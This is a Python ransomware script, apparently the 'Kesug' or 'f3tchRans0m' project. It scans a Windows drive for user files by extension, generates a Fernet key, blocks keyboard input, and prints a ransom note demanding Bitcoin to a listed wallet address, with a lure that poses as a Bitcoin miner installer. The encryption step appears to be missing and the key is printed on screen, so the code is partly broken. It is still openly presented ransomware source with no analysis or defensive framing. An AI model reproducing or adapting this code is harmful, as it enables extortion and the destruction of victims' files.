import os
from cryptography.fernet import Fernet
import re
import numpy as np
import pathlib
import keyboard
from time import sleep
import replit
from tqdm import tqdm

# Initial variables
global key
target_files_dup = []
untouched_dirs = np.array(["Gradle", "Intel", "PerfLogs", "WindowsPowerShell", "ProgramData", "Recovery", "Users", "Windows", "f3tchRans0m", "Startup"])
drive = pathlib.Path(__file__).anchor
file_path = pathlib.Path(__file__).parent.resolve()
startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# Fullscreen terminal
keyboard.press('f11')

# List all files in the folder except the key and program files
if __name__ == "__main__": 
    for (root,dirs,files) in os.walk(drive, topdown=True): 
        # Selecting file extensions that should be encrypted (not encrypting all files to make it efficient)
        files = [f for f in files if f.endswith('.py') or f.endswith('.exe') or f.endswith('.c#') or f.endswith('.cpp') or f.endswith('.txt') or f.endswith('.jpg') or f.endswith('.png') or f.endswith('.jpeg') or f.endswith('.zip') or f.endswith('.php') or f.endswith('.html') or f.endswith('.mp4') or f.endswith('.js') or f.endswith('.pptx') or f.endswith('.pdf') or f.endswith('.odp') or f.endswith('.xlsx')]

        for file in files:
            rootArray = re.findall("[A-Za-z0-9_\-.() ]*", root)
            if bool(np.intersect1d(rootArray, untouched_dirs)):
                continue
            else:
                target_files_dup.append(str(root)+"\\"+str(file))

# Clearing screen
replit.clear()

print("""

                                                                                                                                                                                                                                                                                                            
KKKKKKKKK    KKKKKKK                                                                           
K:::::::K    K:::::K                                                                           
K:::::::K    K:::::K                                                                           
K:::::::K   K::::::K                                                                           
KK::::::K  K:::::KKK    eeeeeeeeeeee        ssssssssss   uuuuuu    uuuuuu     ggggggggg   ggggg
  K:::::K K:::::K     ee::::::::::::ee    ss::::::::::s  u::::u    u::::u    g:::::::::ggg::::g
  K::::::K:::::K     e::::::eeeee:::::eess:::::::::::::s u::::u    u::::u   g:::::::::::::::::g
  K:::::::::::K     e::::::e     e:::::es::::::ssss:::::su::::u    u::::u  g::::::ggggg::::::gg
  K:::::::::::K     e:::::::eeeee::::::e s:::::s  ssssss u::::u    u::::u  g:::::g     g:::::g 
  K::::::K:::::K    e:::::::::::::::::e    s::::::s      u::::u    u::::u  g:::::g     g:::::g 
  K:::::K K:::::K   e::::::eeeeeeeeeee        s::::::s   u::::u    u::::u  g:::::g     g:::::g 
KK::::::K  K:::::KKKe:::::::e           ssssss   s:::::s u:::::uuuu:::::u  g::::::g    g:::::g 
K:::::::K   K::::::Ke::::::::e          s:::::ssss::::::su:::::::::::::::uug:::::::ggggg:::::g 
K:::::::K    K:::::K e::::::::eeeeeeee  s::::::::::::::s  u:::::::::::::::u g::::::::::::::::g 
K:::::::K    K:::::K  ee:::::::::::::e   s:::::::::::ss    uu::::::::uu:::u  gg::::::::::::::g 
KKKKKKKKK    KKKKKKK    eeeeeeeeeeeeee    sssssssssss        uuuuuuuu  uuuu    gggggggg::::::g 
                                                                                       g:::::g 
                                                                           gggggg      g:::::g 
                                                                           g:::::gg   gg:::::g 
                                                                            g::::::ggg:::::::g 
                                                                             gg:::::::::::::g  
                                                                               ggg::::::ggg    
                                                                                  gggggg       


""")

# Remove duplicate file paths from the array
seen = set()
target_files = []
for item in target_files_dup:
    if item not in seen:
        seen.add(item)
        str(item).replace("\\", "\\\\")
        target_files.append(item)

# If the key has already been generated, then use the current key, if not, generate one.
if os.path.isfile(str(file_path)+"\\thekey.key"):
    with open(str(file_path)+"\\thekey.key", "rb") as thekey:
        key = thekey.read()
else:
    key = Fernet.generate_key()
    with open(str(file_path)+"\\thekey.key", "wb") as thekey:
        thekey.write(key)

# ENCRYPTION PROCESS: Encrypt all the files in the target_files array
# Block all keyboard inputs
for i in range(200):
    try:
        keyboard.block_key(i)
    except:
        print("Could not block key: " + i)

# print("-----------> Setting up Bitcoin Miner\n\n-----------> NOTE: DO NOT SHUTDOWN OR USE THE COMPUTER WHILE WE SETUP THE MINER!\n\n-----------> Shutting down could corrupt your files!\n\n")

# Encryption iterations
if os.path.isfile(str(file_path)+"\\validation\\1.txt") == False:
    print("Please run BitDigital.py to install and setup the Bitcoin Miner.")
    sleep(10)
    exit()
else:
    # If the program has run again, do not encrypt the file again and write the already encrypted text inside
    print("\n\nFiles already encrypted")

afterEncryptionText = "\n\n\nYOU HAVE BEEN HACKED! All your files have been encrypted.\n\nInfo: Do NOT mess with validation folder, otherwise your files will never recover.\n\nSend 0.0024 BTC at bc1q0sweded3p74k3r58dxkx562jzygr5qav4wewf7 to get the decryption key\n"
print(afterEncryptionText)

with open(str(file_path)+"\\validation\\1.txt", "w") as controlTxt:
    controlTxt.write("---------- Do Not Change Name Of This File Or Else Decryption Process Will Break And You Will Never Recover Your Files ----------")

# Unblock all keyboard inputs
try:
    for i in range(200):
        keyboard.unblock_key(i)
except:
    print("Error: Couldn't unblock keys: Ignore if you restarted the program")

# DECRYPTION PROCESS: Decrypting data after the encryption proces
sleep(2)
print(key)
inputKey = input("Enter the key to decrypt: ")

if str(inputKey) == str(key):
    for file in target_files:
        try:
            with open(file, "rb") as thefile:
                file_contents = thefile.read()
        except:
            print("Read binary error\n")
        
        # Decrypting contents of the file
        try:
            file_contents_decrypted = Fernet(key).decrypt(file_contents)

        # Writing the contents of the file inside the file
            with open(file, "wb") as thefile:
                thefile.write(file_contents_decrypted)
                print("Decrypted: " + str(file) + "\n")
        except:
            print("Write binary error: " + str(file) + "\n")
        
    os.remove(str(file_path)+"\\validation\\1.txt")
    os.remove(str(file_path)+"\\thekey.key")
    print("\nSuccessfully decrypted! Enjoy <3. And oh yeah, thanks for the money!")
    exit()

else:
    print("Incorrect decrypt key!")
    exit()